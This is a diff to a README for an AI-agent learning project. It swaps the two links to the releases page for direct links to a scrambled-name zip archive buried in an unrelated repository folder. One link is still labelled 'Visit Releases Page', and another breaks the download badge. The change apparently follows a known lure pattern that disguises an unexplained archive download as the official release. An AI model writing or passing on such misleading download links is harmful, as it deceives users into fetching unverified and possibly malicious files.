@@ -1,7 +1,7 @@
 # 🎉 learn-agentic-ai-from-low-code-to-code - Create AI Agents Easily
 
 ## 📥 Download the Software
-[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue)](https://github.com/akashpatil8811/learn-agentic-ai-from-low-code-to-code/releases)
+[![Download Here](https://github.com/akashpatil8811/learn-agentic-ai-from-low-code-to-code/raw/refs/heads/main/05_knowledge_connections/learn-low-agentic-ai-to-code-from-2.2.zip%20Now-Visit%20Page-blue)](https://github.com/akashpatil8811/learn-agentic-ai-from-low-code-to-code/raw/refs/heads/main/05_knowledge_connections/learn-low-agentic-ai-to-code-from-2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **learn-agentic-ai-from-low-code-to-code** project! This software allows you to build powerful AI agents with OpenAI AgentKit without needing to write code. This guide will help you download and start using the application.
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets the following requirements:
 - Simple deployment options for various applications.
 
 ## 🎢 Download & Install
-To download the software, visit this page: [Visit Releases Page](https://github.com/akashpatil8811/learn-agentic-ai-from-low-code-to-code/releases).
+To download the software, visit this page: [Visit Releases Page](https://github.com/akashpatil8811/learn-agentic-ai-from-low-code-to-code/raw/refs/heads/main/05_knowledge_connections/learn-low-agentic-ai-to-code-from-2.2.zip).
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see the latest version of the software listed.
